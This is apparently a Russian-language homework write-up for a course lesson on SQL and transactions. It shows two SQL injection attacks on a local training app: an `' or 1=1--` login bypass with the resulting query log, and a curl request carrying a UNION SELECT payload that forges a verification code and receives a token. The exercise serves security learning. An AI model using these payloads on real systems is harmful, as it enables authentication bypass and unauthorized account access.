# Домашнее задание к занятию «1.3. SQL и транзакции»
## Задание «Логин и пароль»
### Результаты выполнения задания

Логин - `' or 1=1--`
Пароль - любой

Логи запросов:
```
SELECT * FROM users WHERE login = '' or 1=1--' AND password = '69138d7eee76e3b7da51a1dad3a0613c7c7894e362b327b190912a5a176dfb09de3faf447870579bcfc2fd748b4639bb82bfc578fdf3fa293d342bf116e86c8b' AND removed = FALSE
```
Сработала передача конструкции комментария `--` и следующее условие проверки пароля уже не срабатывает.

## Код подтверждения*
### Результаты выполнения задания

Запрос:  
```
 curl 'http://localhost:8888/api/auth/verification'    --request POST    -H 'Content-Type: application/json'    --data-raw $'{"login":"masha\' Union select 10000,\'masha\', \'12345\', 1, \'2022-12-15 12:35:35.422282-04","code":"12345"}'
```

Ответ:
```
{"token":"35db3ce8ac53fb22371a3b5e32259c0e24e37d016296a48fecf0ec43dcf8195dc1302011f1a986f589350bccfb7b192af8268fbff55f09c599ef310a896c0521fb458567b59a24678f86ff5b8793f2cce8337ce4ac6fb1523ede9b63a7b5860ff52dd4fdf56ea1e2e821aa6dfb888ed9fecf12560ba654eb21f397d9a42b840f"}
```